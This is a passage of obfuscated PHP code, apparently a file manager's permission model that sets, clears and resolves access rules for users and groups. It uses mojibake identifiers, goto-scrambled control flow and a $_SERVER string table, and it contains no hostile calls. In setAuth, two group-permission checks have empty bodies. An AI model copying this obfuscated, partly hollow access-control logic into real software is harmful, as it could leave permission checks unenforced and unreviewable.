bŒÎä­ß¤Œ: } public function setAuth($E¡Í¹Øƒ“å, $aóÃˆáë˜•) { goto aå²ÂÙÑ¼§; E–³ÎØóÜä: return !0; goto F½Òöâƒ¸ñ; D¾›¶×Çá‘: if ($cğ‘Š‚ÕÒ†[$CŒÄİÜ£¨Ú[383]] != SourceModel::TYPE_GROUP) { return !1; } $d¤–ÑìÎ‚ = 1; $eĞƒğĞùÃä = $cğ‘Š‚ÕÒ†[$CŒÄİÜ£¨Ú[469]]; goto A¡´í›¿Áä; aå²ÂÙÑ¼§: $CŒÄİÜ£¨Ú =& $_SERVER[¨¤¼…´]; $cğ‘Š‚ÕÒ† = Model($CŒÄİÜ£¨Ú[1107])->sourceInfo($E¡Í¹Øƒ“å); if (!$cğ‘Š‚ÕÒ†) { return !1; } goto D¾›¶×Çá‘; A¡´í›¿Áä: if ($eĞƒğĞùÃä != $d¤–ÑìÎ‚) { $dòÛ¯Š†ŞÈ = array($CŒÄİÜ£¨Ú[2095] => $eĞƒğĞùÃä); $AØ¦Ã›Áé = Model($CŒÄİÜ£¨Ú[2174])->field($CŒÄİÜ£¨Ú[1425])->where($dòÛ¯Š†ŞÈ)->select(); $AØ¦Ã›Áé = array_to_keyvalue($AØ¦Ã›Áé, $CŒÄİÜ£¨Ú[43], $CŒÄİÜ£¨Ú[1425]); } $a¿è©ÖÄ‘ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $eë†ƒî÷ï× = array(); goto C°¼§Ô¶‡ï; C°¼§Ô¶‡ï: foreach ($aóÃˆáë˜• as $CŞ²ğÃÃñ) { if (!in_array($CŞ²ğÃÃñ[$CŒÄİÜ£¨Ú[383]], $a¿è©ÖÄ‘)) { show_json(LNG($CŒÄİÜ£¨Ú[2259]), !1); } if ($eĞƒğĞùÃä != $d¤–ÑìÎ‚) { if ($CŞ²ğÃÃñ[$CŒÄİÜ£¨Ú[383]] == SourceModel::TYPE_GROUP) { } if ($CŞ²ğÃÃñ[$CŒÄİÜ£¨Ú[469]] != 0 && !in_array($CŞ²ğÃÃñ[$CŒÄİÜ£¨Ú[469]], $AØ¦Ã›Áé)) { } } if ($CŞ²ğÃÃñ[$CŒÄİÜ£¨Ú[469]] == 0) { $CŞ²ğÃÃñ[$CŒÄİÜ£¨Ú[383]] = SourceModel::TYPE_USER; } $eë†ƒî÷ï×[] = array($CŒÄİÜ£¨Ú[381] => $E¡Í¹Øƒ“å, $CŒÄİÜ£¨Ú[383] => intval($CŞ²ğÃÃñ[$CŒÄİÜ£¨Ú[383]]), $CŒÄİÜ£¨Ú[469] => intval($CŞ²ğÃÃñ[$CŒÄİÜ£¨Ú[469]]), $CŒÄİÜ£¨Ú[2239] => intval($CŞ²ğÃÃñ[$CŒÄİÜ£¨Ú[2239]]) ? intval($CŞ²ğÃÃñ[$CŒÄİÜ£¨Ú[2239]]) : 0, $CŒÄİÜ£¨Ú[2240] => intval($CŞ²ğÃÃñ[$CŒÄİÜ£¨Ú[2240]]) ? intval($CŞ²ğÃÃñ[$CŒÄİÜ£¨Ú[2240]]) : -1); } $this->where(array($CŒÄİÜ£¨Ú[395] => $E¡Í¹Øƒ“å))->delete(); $this->addAll($eë†ƒî÷ï×); goto E–³ÎØóÜä; F½Òöâƒ¸ñ: } public function authClear($eìƒÓáœ‡†) { $b¿é¬¼†Áß =& $_SERVER[¨¤¼…´]; $Fùòæòø¬„ = Model($b¿é¬¼†Áß[1107])->sourceInfo($eìƒÓáœ‡†); $Dø¹ºÍÂ‡ = array($eìƒÓáœ‡†); if ($Fùòæòø¬„[$b¿é¬¼†Áß[382]] == $b¿é¬¼†Áß[93]) { $EÃï†Ş§° = array($b¿é¬¼†Áß[538] => array($b¿é¬¼†Áß[496], $Fùòæòø¬„[$b¿é¬¼†Áß[472]] . $eìƒÓáœ‡† . $b¿é¬¼†Áß[497])); $Dø¹ºÍÂ‡ = Model($b¿é¬¼†Áß[1107])->field($b¿é¬¼†Áß[395])->where($EÃï†Ş§°)->getField($b¿é¬¼†Áß[381], !0); $Dø¹ºÍÂ‡[] = $eìƒÓáœ‡†; } $this->where(array($b¿é¬¼†Áß[395] => array($b¿é¬¼†Áß[396], $Dø¹ºÍÂ‡)))->delete(); return !0; } public function getAllChildren($AŠæÇè‡µ) { goto B§š°ÅËÖÑ; Eîáª±ùÔ…: if (!$ağÂ ¹Ï¿ï) { return array(); } $E¸‹¦öÜ‘Ø = $aÜî¨î¥«½[2260]; $bè°é¢¥ö  = array($aÜî¨î¥«½[381] => array($aÜî¨î¥«½[7], $ağÂ ¹Ï¿ï), $aÜî¨î¥«½[409] => $aÜî¨î¥«½[481]); goto cˆ‡•÷³ÔÕ; bâ¹œ¢µƒº: if ($dÓãÀ‘¬ù[$aÜî¨î¥«½[474]] == $aÜî¨î¥«½[481] && $dÓãÀ‘¬ù[$aÜî¨î¥«½[469]] != $AÑ—ªªÎˆ¹) { $AËôĞ‰œí¨ = $this->groupChidldAllRootSource($dÓãÀ‘¬ù[$aÜî¨î¥«½[469]]); } $ağÂ ¹Ï¿ï = $this->field($aÜî¨î¥«½[381])->group($aÜî¨î¥«½[381])->select(); $ağÂ ¹Ï¿ï = array_to_keyvalue($ağÂ ¹Ï¿ï, $aÜî¨î¥«½[43], $aÜî¨î¥«½[381]); goto Eîáª±ùÔ…; D–Œƒ ×»Á: return $this->sourceListAuth($aîÅÀ¦è…ô); goto bÂáŒ†»Ø®; cˆ‡•÷³ÔÕ: $Cá™ßñ³áƒ = Model($aÜî¨î¥«½[742])->field($E¸‹¦öÜ‘Ø)->where($bè°é¢¥ö )->select(); $aîÅÀ¦è…ô = array($AŠæÇè‡µ); foreach ($Cá™ßñ³áƒ as $EÈƒèÊ¶Ğ) { foreach ($AËôĞ‰œí¨ as $BŞæ´Í¥Àà) { $aÀîäçÜï = $aÜî¨î¥«½[57] . $BŞæ´Í¥Àà . $aÜî¨î¥«½[57]; $e«†êÏì˜— = $EÈƒèÊ¶Ğ[$aÜî¨î¥«½[472]] . $EÈƒèÊ¶Ğ[$aÜî¨î¥«½[381]] . $aÜî¨î¥«½[57]; if (strstr($e«†êÏì˜—, $aÀîäçÜï)) { $aîÅÀ¦è…ô[] = $EÈƒèÊ¶Ğ[$aÜî¨î¥«½[381]]; break; } } } goto D–Œƒ ×»Á; Aˆ£êÊæµ¾: if ($dÓãÀ‘¬ù[$aÜî¨î¥«½[383]] != SourceModel::TYPE_GROUP) { return array(); } $AÑ—ªªÎˆ¹ = 1; $AËôĞ‰œí¨ = array($AŠæÇè‡µ); goto bâ¹œ¢µƒº; B§š°ÅËÖÑ: $aÜî¨î¥«½ =& $_SERVER[¨¤¼…´]; $dÓãÀ‘¬ù = Model($aÜî¨î¥«½[1107])->sourceInfo($AŠæÇè‡µ); if ($dÓãÀ‘¬ù[$aÜî¨î¥«½[382]] != $aÜî¨î¥«½[93]) { return $this->sourceListAuth(array($AŠæÇè‡µ)); } goto Aˆ£êÊæµ¾; bÂáŒ†»Ø®: } private function sourceListAuth($C”ƒóç”‡) { goto D§öíÕÈÅ; D§öíÕÈÅ: $EºäÉ‘¡Ü“ =& $_SERVER[¨¤¼…´]; $béï¹ÄÔ²ƒ = Model($EºäÉ‘¡Ü“[1107])->sourceListInfo($C”ƒóç”‡, !0); $fáº™§¬¨ô = $EºäÉ‘¡Ü“[2257]; goto aå™ÕäÜ™; E¶×‘®¬©: $CİøÎÕ³ö = array(); foreach ($béï¹ÄÔ²ƒ as $d³Í‰Ïè) { goto A‡ÆÚÃí‰; a™ãÉƒ¦õé: $EÌğ¬ºáŠ® = count(explode($EºäÉ‘¡Ü“[8], trim($d³Í‰Ïè[$EºäÉ‘¡Ü“[479]], $EºäÉ‘¡Ü“[8]))); $CİøÎÕ³ö[] = $EÌğ¬ºáŠ® + ($d³Í‰Ïè[$EºäÉ‘¡Ü“[39]] == $EºäÉ‘¡Ü“[86] ? 0 : 1000); goto AÀÌ¤Ğ”‹Æ; eèÔ‡ƒ³Á†: unset($d³Í‰Ïè[$EºäÉ‘¡Ü“[403]]); $d“ëì…øùŞ = $bğÇ­°µÁ[$d³Í‰Ïè[$EºäÉ‘¡Ü“[381]]]; if (!$d“ëì…øùŞ) { continue; } goto E©‘³ô‚¢; A‡ÆÚÃí‰: unset($d³Í‰Ïè[$EºäÉ‘¡Ü“[391]]); unset($d³Í‰Ïè[$EºäÉ‘¡Ü“[390]]); unset($d³Í‰Ïè[$EºäÉ‘¡Ü“[388]]); goto eèÔ‡ƒ³Á†; E©‘³ô‚¢: $d³Í‰Ïè[$EºäÉ‘¡Ü“[2261]] = $this->authTargetInfo($d“ëì…øùŞ); $d³Í‰Ïè[$EºäÉ‘¡Ü“[479]] = rtrim($d³Í‰Ïè[$EºäÉ‘¡Ü“[475]], $EºäÉ‘¡Ü“[8]) . $EºäÉ‘¡Ü“[8] . ltrim($d³Í‰Ïè[$EºäÉ‘¡Ü“[479]], $EºäÉ‘¡Ü“[8]); $c´Ì¸öƒ³[] = $d³Í‰Ïè; goto a™ãÉƒ¦õé; AÀÌ¤Ğ”‹Æ: } array_multisort($CİøÎÕ³ö, SORT_ASC, $c´Ì¸öƒ³); goto f¢îøµ¶¤³; f¢îøµ¶¤³: return $c´Ì¸öƒ³; goto eµš’™ßŒ; aå™ÕäÜ™: $d…Ô·‡Šè = $this->field($fáº™§¬¨ô)->where(array($EºäÉ‘¡Ü“[381] => array($EºäÉ‘¡Ü“[7], $C”ƒóç”‡)))->select(); $bğÇ­°µÁ = array_to_keyvalue_group($d…Ô·‡Šè, $EºäÉ‘¡Ü“[381]); $c´Ì¸öƒ³ = array(); goto E¶×‘®¬©; eµš’™ßŒ: } private function groupChidldAllRootSource($b²ÑéóÉ÷) { $C‰ÙÖ¶†ª =& $_SERVER[¨¤¼…´]; $A”ÜšÜÎ§é = Model($C‰ÙÖ¶†ª[2262])->groupChildrenAll($b²ÑéóÉ÷); $EÇß°ªÀ¶ = array($C‰ÙÖ¶†ª[474] => 0, $C‰ÙÖ¶†ª[469] => array($C‰ÙÖ¶†ª[7], $A”ÜšÜÎ§é), $C‰ÙÖ¶†ª[383] => SourceModel::TYPE_GROUP); $b¿ «‰¼‡  = Model($C‰ÙÖ¶†ª[742])->field($C‰ÙÖ¶†ª[381])->where($EÇß°ªÀ¶)->select(); $b¿ «‰¼‡  = array_to_keyvalue($b¿ «‰¼‡ , $C‰ÙÖ¶†ª[43], $C‰ÙÖ¶†ª[381]); return $b¿ «‰¼‡ ; } private function authTargetInfo($CÊŒè¶Ë) { goto B˜õ½×Ù²ø; B˜õ½×Ù²ø: $Aìİ¯Úßí¶ =& $_SERVER[¨¤¼…´]; $AßÚáˆ÷À = array(); $F¤–áßÃ±í = array(); goto eºğ·‡ÛÌ; eºğ·‡ÛÌ: $cÃ‚ªğ¡»Å = 2 << 25; foreach ($CÊŒè¶Ë as $fÙ¬Ñ½àìß) { goto e¶òàÛÑÉğ; A†ÙÙ÷­«‘: if ($fÙ¬Ñ½àìß[$Aìİ¯Úßí¶[383]] == SourceModel::TYPE_USER && $fÙ¬Ñ½àìß[$Aìİ¯Úßí¶[469]] == $Aìİ¯Úßí¶[481]) { $CøÂÙËˆç = 0; } $F¤–áßÃ±í[] = $C‡çŒ‹ÏØ[$Aìİ¯Úßí¶[388]] + $CøÂÙËˆç; goto a°¶ÜÜÒÊ; e¶òàÛÑÉğ: $C‡çŒ‹ÏØ = Model($Aìİ¯Úßí¶[2258])->listData($fÙ¬Ñ½àìß[$Aìİ¯Úßí¶[2239]]); if (!$C‡çŒ‹ÏØ) { continue; } if ($fÙ¬Ñ½àìß[$Aìİ¯Úßí¶[383]] == SourceModel::TYPE_USER) { $D‚ˆµòÌ¨Û = Model($Aìİ¯Úßí¶[487])->getInfoSimpleOuter($fÙ¬Ñ½àìß[$Aìİ¯Úßí¶[469]]); if ($D‚ˆµòÌ¨Û[$Aìİ¯Úßí¶[1425]] == $Aìİ¯Úßí¶[1022]) { continue; } if ($D‚ˆµòÌ¨Û[$Aìİ¯Úßí¶[1425]] == $Aìİ¯Úßí¶[481]) { $D‚ˆµòÌ¨Û[$Aìİ¯Úßí¶[38]] = LNG($Aìİ¯Úßí¶[2263]); } } else { $D‚ˆµòÌ¨Û = Model($Aìİ¯Úßí¶[471])->getInfoSimple($fÙ¬Ñ½àìß[$Aìİ¯Úßí¶[469]]); } goto D«‘­Ø²Š†; D«‘­Ø²Š†: if (!$D‚ˆµòÌ¨Û) { continue; } $D‚ˆµòÌ¨Û[$Aìİ¯Úßí¶[430]] = $C‡çŒ‹ÏØ; $AßÚáˆ÷À[] = $D‚ˆµòÌ¨Û; goto Eç©¢éä; Eç©¢éä: $CøÂÙËˆç = 0; if ($fÙ¬Ñ½àìß[$Aìİ¯Úßí¶[383]] == SourceModel::TYPE_GROUP) { $CøÂÙËˆç = $cÃ‚ªğ¡»Å * 2; } if ($fÙ¬Ñ½àìß[$Aìİ¯Úßí¶[383]] == SourceModel::TYPE_USER) { $CøÂÙËˆç = $cÃ‚ªğ¡»Å; } goto A†ÙÙ÷­«‘; a°¶ÜÜÒÊ: } array_multisort($F¤–áßÃ±í, SORT_DESC, $AßÚáˆ÷À); goto B¾“´±˜‡°; B¾“´±˜‡°: return $AßÚáˆ÷À; goto e²Ôˆ¦Óƒò; e²Ôˆ¦Óƒò: } public function getAllChildrenByUser($f„™ˆ¡Š…“, $EÎÑŞïµ·¦) { goto D÷ÚÜø×Õ; bŠäãØÎ: if ($A›å¸ñŠÚª[$cõÅ¥Ê¸ß™[474]] == $cõÅ¥Ê¸ß™[481] && $A›å¸ñŠÚª[$cõÅ¥Ê¸ß™[469]] != $eÊ¬»’õß && $this->groupContainUser($A›å¸ñŠÚª[$cõÅ¥Ê¸ß™[469]], $EÎÑŞïµ·¦)) { foreach ($A¾áîİ´ˆ[$cõÅ¥Ê¸ß™[2264]] as $Bçää‚–è) { $d£ßÇŠàæà = Model($cõÅ¥Ê¸ß™[471])->getInfo($Bçää‚–è[$cõÅ¥Ê¸ß™[2095]]); $D”Œ›ïÑĞÆ = Model($cõÅ¥Ê¸ß™[490])->getInfoSimpleOuter($EÎÑŞïµ·¦); $D”Œ›ïÑĞÆ[$cõÅ¥Ê¸ß™[430]] = $Bçää‚–è[$cõÅ¥Ê¸ß™[388]]; if (Model($cõÅ¥Ê¸ß™[2258])->authCheckAction($Bçää‚–è[$cõÅ¥Ê¸ß™[388]][$cõÅ¥Ê¸ß™[388]], $cõÅ¥Ê¸ß™[1549])) { continue; } $c÷µ¬¼„©ˆ = array($cõÅ¥Ê¸ß™[38] => $cõÅ¥Ê¸ß™[1378] . $d£ßÇŠàæà[$cõÅ¥Ê¸ß™[38]], $cõÅ¥Ê¸ß™[381] => $d£ßÇŠàæà[$cõÅ¥Ê¸ß™[403]][$cõÅ¥Ê¸ß™[381]], $cõÅ¥Ê¸ß™[85] => KodIO::make($d£ßÇŠàæà[$cõÅ¥Ê¸ß™[403]][$cõÅ¥Ê¸ß™[381]]), $cõÅ¥Ê¸ß™[474] => $cõÅ¥Ê¸ß™[481], $cõÅ¥Ê¸ß™[383] => $cõÅ¥Ê¸ß™[957], $cõÅ¥Ê¸ß™[39] => $cõÅ¥Ê¸ß™[501], $cõÅ¥Ê¸ß™[479] => $d£ßÇŠàæà[$cõÅ¥Ê¸ß™[476]], $cõÅ¥Ê¸ß™[2095] => $d£ßÇŠàæà[$cõÅ¥Ê¸ß™[2095]], $cõÅ¥Ê¸ß™[473] => $d£ßÇŠàæà[$cõÅ¥Ê¸ß™[474]], $cõÅ¥Ê¸ß™[2261] => array($D”Œ›ïÑĞÆ)); $DÓíŠ’¢Ä™[$c÷µ¬¼„©ˆ[$cõÅ¥Ê¸ß™[381]]] = $c÷µ¬¼„©ˆ; } } $FÌõƒ±ñÏŞ = array(); $C‘ëÜâ™Ô» = $this->getAllChildren($f„™ˆ¡Š…“); goto e½Ø‘è¶ÃÕ; cô‘¿ˆ¡ñˆ: $A›å¸ñŠÚª = Model($cõÅ¥Ê¸ß™[1107])->sourceInfo($f„™ˆ¡Š…“); $DÓíŠ’¢Ä™ = array(); $eÊ¬»’õß = 1; goto bŠäãØÎ; D÷ÚÜø×Õ: $cõÅ¥Ê¸ß™ =& $_SERVER[¨¤¼…´]; $A¾áîİ´ˆ = Model($cõÅ¥Ê¸ß™[490])->getInfo($EÎÑŞïµ·¦); if (!$EÎÑŞïµ·¦ || !$f„™ˆ¡Š…“ || !$A¾áîİ´ˆ) { return array(); } goto cô‘¿ˆ¡ñˆ; e½Ø‘è¶ÃÕ: foreach ($C‘ëÜâ™Ô» as $cÂñÄâˆ ) { $bÜäŒåª°Ù = !1; foreach ($cÂñÄâˆ [$cõÅ¥Ê¸ß™[2261]] as $C×…Š™‘Š‡) { if ($C×…Š™‘Š‡[$cõÅ¥Ê¸ß™[1425]]) { if ($C×…Š™‘Š‡[$cõÅ¥Ê¸ß™[1425]] == $EÎÑŞïµ·¦) { $bÜäŒåª°Ù = !0; break; } } if ($C×…Š™‘Š‡[$cõÅ¥Ê¸ß™[2095]]) { if ($this->groupContainUser($C×…Š™‘Š‡[$cõÅ¥Ê¸ß™[2095]], $EÎÑŞïµ·¦)) { $bÜäŒåª°Ù = !0; break; } } } if ($bÜäŒåª°Ù) { $FÌõƒ±ñÏŞ[] = $cÂñÄâˆ ; } $DÌ‡¥Î¡ˆñ = $cÂñÄâˆ [$cõÅ¥Ê¸ß™[381]]; if (isset($DÓíŠ’¢Ä™[$DÌ‡¥Î¡ˆñ])) { $cÂñÄâˆ [$cõÅ¥Ê¸ß™[2261]][] = $DÓíŠ’¢Ä™[$DÌ‡¥Î¡ˆñ][0]; $DÓíŠ’¢Ä™[$DÌ‡¥Î¡ˆñ] = !1; } } $DÓíŠ’¢Ä™ = array_filter(array_values($DÓíŠ’¢Ä™)); $FÌõƒ±ñÏŞ = array_merge($DÓíŠ’¢Ä™, $FÌõƒ±ñÏŞ); goto CšéåÃ‡±¡; CšéåÃ‡±¡: return $FÌõƒ±ñÏŞ; goto B¯ÉöÃ”ë…; B¯ÉöÃ”ë…: } public function setAllChildrenByUser($F‡¢ùœŞÔ¾, $AŠ‘ÆÔ‚ŠÍ, $a¶®«™¢­) { $EÜÍ—è¯ =& $_SERVER[¨¤¼…´]; $eŞ‘ÑÌ†•æ = $this->getAllChildrenByUser($F‡¢ùœŞÔ¾, $AŠ‘ÆÔ‚ŠÍ); if (!$a¶®«™¢­ || !$eŞ‘ÑÌ†•æ) { return !1; } foreach ($eŞ‘ÑÌ†•æ as $B¤’ˆÄ©Øˆ) { $eøÜšÇİ÷Ê = array(); foreach ($B¤’ˆÄ©Øˆ[$EÜÍ—è¯[2261]] as $cè¯»˜·Â) { $AˆÌ™ŠóÉ = $cè¯»˜·Â[$EÜÍ—è¯[430]]; $C÷Ÿ„ÜÎù‹ = $cè¯»˜·Â[$EÜÍ—è¯[1425]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $Aºö£¸ÛÈ = $cè¯»˜·Â[$EÜÍ—è¯[1425]] ? $cè¯»˜·Â[$EÜÍ—è¯[1425]] : $cè¯»˜·Â[$EÜÍ—è¯[2095]]; if ($cè¯»˜·Â[$EÜÍ—è¯[1425]] && $cè¯»˜·Â[$EÜÍ—è¯[1425]] == $AŠ‘ÆÔ‚ŠÍ) { continue; } $eøÜšÇİ÷Ê[] = array($EÜÍ—è¯[381] => $B¤’ˆÄ©Øˆ[$EÜÍ—è¯[381]], $EÜÍ—è¯[383] => $C÷Ÿ„ÜÎù‹, $EÜÍ—è¯[469] => intval($Aºö£¸ÛÈ), $EÜÍ—è¯[2239] => isset($AˆÌ™ŠóÉ[$EÜÍ—è¯[379]]) ? intval($AˆÌ™ŠóÉ[$EÜÍ—è¯[379]]) : 0, $EÜÍ—è¯[2240] => isset($AˆÌ™ŠóÉ[$EÜÍ—è¯[2240]]) ? intval($AˆÌ™ŠóÉ[$EÜÍ—è¯[2240]]) : -1); } $eøÜšÇİ÷Ê[] = array($EÜÍ—è¯[381] => $B¤’ˆÄ©Øˆ[$EÜÍ—è¯[381]], $EÜÍ—è¯[383] => SourceModel::TYPE_USER, $EÜÍ—è¯[469] => intval($AŠ‘ÆÔ‚ŠÍ), $EÜÍ—è¯[2239] => intval($a¶®«™¢­), $EÜÍ—è¯[2240] => -1); $this->where(array($EÜÍ—è¯[395] => $B¤’ˆÄ©Øˆ[$EÜÍ—è¯[381]]))->delete(); $this->addAll($eøÜšÇİ÷Ê); } return !0; } public function get($E“Š“åŞÃõ) { $d›ÈèÚëÏ„ = $this->getSourceList(array($E“Š“åŞÃõ), !0); return $d›ÈèÚëÏ„[0]; } public function getSourceList($DÀœêæàº¯, $EÕ´É¬ ¯ = false, $a¥ÂŠƒÄ¿Ñ = false) { goto A¡óÜ†çê¾; cÂ“é•ô÷ë: $a«‰Œ¤¶˜Ã = $eÌ‡¼È¸ [2266]; $AäÀ£¢ÀÇ = array($eÌ‡¼È¸ [395] => array($eÌ‡¼È¸ [396], $dÓ¥Â‡ë“Æ)); $cÄ×Ãî†‡Î = $this->field($a«‰Œ¤¶˜Ã)->where($AäÀ£¢ÀÇ)->select(); goto E¨ÑÁóÃ¯¡; d‹‚ŞŞ‡œº: foreach ($EÕ´É¬ ¯ as $cŒ„íö³Ï => $a«„‰É¢¬”) { $d´…ßÉ¿ç­ = $aÍ“¼ÆÃ->parentLevelArray($a«„‰É¢¬”[$eÌ‡¼È¸ [472]]); $dÓ¥Â‡ë“Æ = array_merge($dÓ¥Â‡ë“Æ, array($cŒ„íö³Ï), array_reverse($d´…ßÉ¿ç­)); } $dÓ¥Â‡ë“Æ = array_values(array_unique($dÓ¥Â‡ë“Æ)); if (!$dÓ¥Â‡ë“Æ) { return array(); } goto cÂ“é•ô÷ë; d—ßİÛˆ‰‘: if (!$EÕ´É¬ ¯ && count($DÀœêæàº¯) == 1) { $EÕ´É¬ ¯ = array(); $EÕ´É¬ ¯[$DÀœêæàº¯[0]] = $aÍ“¼ÆÃ->sourceInfo($DÀœêæàº¯[0]); } if (!$EÕ´É¬ ¯) { $AäÀ£¢ÀÇ = array($eÌ‡¼È¸ [395] => array($eÌ‡¼È¸ [396], $DÀœêæàº¯)); $EÕ´É¬ ¯ = $aÍ“¼ÆÃ->field($eÌ‡¼È¸ [2265])->where($AäÀ£¢ÀÇ)->select(); $EÕ´É¬ ¯ = array_to_keyvalue($EÕ´É¬ ¯, $eÌ‡¼È¸ [381]); } $dÓ¥Â‡ë“Æ = $DÀœêæàº¯; goto d‹‚ŞŞ‡œº; E¨ÑÁóÃ¯¡: $cÄ×Ãî†‡Î = array_to_keyvalue_group($cÄ×Ãî†‡Î, $eÌ‡¼È¸ [381]); $aÔÑîÌå¶Œ = array(); foreach ($dÓ¥Â‡ë“Æ as $aí—Óâ‘†Ï) { if (isset($cÄ×Ãî†‡Î[$aí—Óâ‘†Ï])) { $aÔÑîÌå¶Œ[$aí—Óâ‘†Ï] = $cÄ×Ãî†‡Î[$aí—Óâ‘†Ï]; } } goto cŸ¸ßùÀá; A¡óÜ†çê¾: $eÌ‡¼È¸  =& $_SERVER[¨¤¼…´]; if (!$DÀœêæàº¯) { return array(); } $aÍ“¼ÆÃ = Model($eÌ‡¼È¸ [1107]); goto d—ßİÛˆ‰‘; dÑÎ¬ùŸÛ¯: $Aœ×†õ¤Çì = array(); foreach ($EÕ´É¬ ¯ as $aí—Óâ‘†Ï => $b‹¤ô‹»†’) { if ($E‘ËéÛŒ¬Ï) { $Aœ×†õ¤Çì[$aí—Óâ‘†Ï] = $D×Êæ‚ùÙ…; continue; } $Aœ×†õ¤Çì[$aí—Óâ‘†Ï] = $this->makeSourceAuth($b‹¤ô‹»†’, $aÔÑîÌå¶Œ, $a¥ÂŠƒÄ¿Ñ); } return $Aœ×†õ¤Çì; goto Fø¯¹êÇ¢; cŸ¸ßùÀá: $E‘ËéÛŒ¬Ï = $this->userIsRoot($a¥ÂŠƒÄ¿Ñ); $c±ŠÔÂ¥äÒ = AuthModel::authAll(); $D×Êæ‚ùÙ… = array($eÌ‡¼È¸ [389] => $c±ŠÔÂ¥äÒ, $eÌ‡¼È¸ [2267] => array($eÌ‡¼È¸ [397] => 0, $eÌ‡¼È¸ [2101] => $c±ŠÔÂ¥äÒ, $eÌ‡¼È¸ [398] => LNG($eÌ‡¼È¸ [2268]), $eÌ‡¼È¸ [2115] => $eÌ‡¼È¸ [2269])); goto dÑÎ¬ùŸÛ¯; Fø¯¹êÇ¢: } public function authDeepCheck($E„«º¯ŒĞÇ, $B¿§’¶Œ = false) { goto A“†å í„; E¯£õ³±øÌ: if (!in_array($E„«º¯ŒĞÇ, $e‘—ˆ¬—Œ[$càÈÒã‹ÆÒ[2270]])) { return !1; } $aŒ§ÓÖí‰Ø = array(); foreach ($e‘—ˆ¬—Œ[$càÈÒã‹ÆÒ[2271]] as $B¬ÌˆïÁ¾« => $e‡Ä”ÈãÑ) { if (!in_array($E„«º¯ŒĞÇ, $e‡Ä”ÈãÑ)) { continue; } $aŒ§ÓÖí‰Ø[] = $B¬ÌˆïÁ¾«; } goto f·¤ŞÎêŸ; f·¤ŞÎêŸ: $F‰‡ÇÓë¨æ = $aŒ§ÓÖí‰Ø ? $aŒ§ÓÖí‰Ø[0] : $E„«º¯ŒĞÇ; return array($càÈÒã‹ÆÒ[389] => -1, $càÈÒã‹ÆÒ[430] => array($càÈÒã‹ÆÒ[397] => $càÈÒã‹ÆÒ[1022], $càÈÒã‹ÆÒ[2101] => $càÈÒã‹ÆÒ[481], $càÈÒã‹ÆÒ[398] => LNG($càÈÒã‹ÆÒ[2272]), $càÈÒã‹ÆÒ[2115] => $càÈÒã‹ÆÒ[2273]), $càÈÒã‹ÆÒ[2274] => LNG($càÈÒã‹ÆÒ[2275]), $càÈÒã‹ÆÒ[2276] => $this->sourceAuthInfo($F‰‡ÇÓë¨æ)); goto cé¿»œ¾ò; A“†å í„: $càÈÒã‹ÆÒ =& $_SERVER[¨¤¼…´]; $B¿§’¶Œ = $B¿§’¶Œ ? $B¿§’¶Œ : USER_ID; $e‘—ˆ¬—Œ = $this->makeAuthDeep($B¿§’¶Œ); goto E¯£õ³±øÌ; cé¿»œ¾ò: } protected function makeAuthDeep($eê¢æë¸½¿ = false) { goto F´ÃŸÀ†é¸; E‡¿Áëï­µ: $dæ—ØïÖöğ = Model($A½šÅ¥«ì[1107]); $C‘ˆ²è¥™Â = Model($A½šÅ¥«ì[471]); $e»È¹Œğ«ó = array(); goto bÚŒñÄòã; FÚ½Ôƒº¢ƒ: $dŸÌæâ©ÇÕ = array_to_keyvalue($cÒ¶ß¢Îòñ, $A½šÅ¥«ì[43], $A½šÅ¥«ì[381]); $dœ‰×‚§Í = array(); $dñÎÒƒ£ç‘ = $eäƒ¶å™; goto E‡¿Áëï­µ; E¡ÀÂİİØ‚: $cñ…á•²‘Ú[$eê¢æë¸½¿] = $dòäÖ„ùèï; return $dòäÖ„ùèï; goto cèèˆœá‚–; A‡ÅÕ”©™—: if ($dŸÌæâ©ÇÕ) { $cõ Ï‡²Ë = $dæ—ØïÖöğ->where(array($A½šÅ¥«ì[381] => array($A½šÅ¥«ì[396], $dŸÌæâ©ÇÕ)))->select(); foreach ($cõ Ï‡²Ë as $f¯ìŒòß®›) { $dò£¦ŒéÕ = $dæ—ØïÖöğ->parentLevelArray($f¯ìŒòß®›[$A½šÅ¥«ì[472]]); $dœ‰×‚§Í = array_merge($dœ‰×‚§Í, $dò£¦ŒéÕ); $dñÎÒƒ£ç‘[] = $f¯ìŒòß®›[$A½šÅ¥«ì[469]]; $e»È¹Œğ«ó[$f¯ìŒòß®›[$A½šÅ¥«ì[381]]] = $dò£¦ŒéÕ; $b…ßÇììâ¢[$f¯ìŒòß®›[$A½šÅ¥«ì[381]]] = $f¯ìŒòß®›[$A½šÅ¥«ì[469]]; } } $dñÎÒƒ£ç‘ = array_values(array_unique($dñÎÒƒ£ç‘)); $B£ÀÎ‹Å¿™ = $dñÎÒƒ£ç‘; goto b»—â¹«è; B¤·¢„Ø” : foreach ($cÁÃÚÈ‹Ô‰ as $DƒËˆ÷¥„) { if ($DƒËˆ÷¥„[$A½šÅ¥«ì[388]] == 0 && $DƒËˆ÷¥„[$A½šÅ¥«ì[2116]] == $A½šÅ¥«ì[93]) { $aÌÁİÍÌÃß[] = $DƒËˆ÷¥„[$A½šÅ¥«ì[379]]; } } $eäƒ¶å™ = $this->userGroupParents($eê¢æë¸½¿); $a‚ŞÄ³–Ã¬ = array($A½šÅ¥«ì[383] => SourceModel::TYPE_USER, $A½šÅ¥«ì[469] => $eê¢æë¸½¿); goto bÉôˆ™­·; e¯¦ÜÆÉ…¼: foreach ($e»È¹Œğ«ó as $F×‹“¿©©÷ => $AÏ¹¿‡Ô®) { $böİˆ³ªŒÑ = $b…ßÇììâ¢[$F×‹“¿©©÷]; if (!$böİˆ³ªŒÑ || !$CŒÜ¶ªİŞ[$böİˆ³ªŒÑ]) { continue; } $F¹µ÷¯¼Å“ = array(); foreach ($e¹œˆÈâ¾[$böİˆ³ªŒÑ] as $e¿†¨›ºóù) { $F¹µ÷¯¼Å“[] = $CŒÜ¶ªİŞ[$e¿†¨›ºóù]; } $e»È¹Œğ«ó[$F×‹“¿©©÷] = array_merge($F¹µ÷¯¼Å“, $AÏ¹¿‡Ô®); } $dœ‰×‚§Í = array_values(array_unique($dœ‰×‚§Í)); $dòäÖ„ùèï = array($A½šÅ¥«ì[2270] => $dœ‰×‚§Í, $A½šÅ¥«ì[2271] => $e»È¹Œğ«ó); goto E¡ÀÂİİØ‚; bÚŒñÄòã: $b…ßÇììâ¢ = array(); $CŒÜ¶ªİŞ = array(); 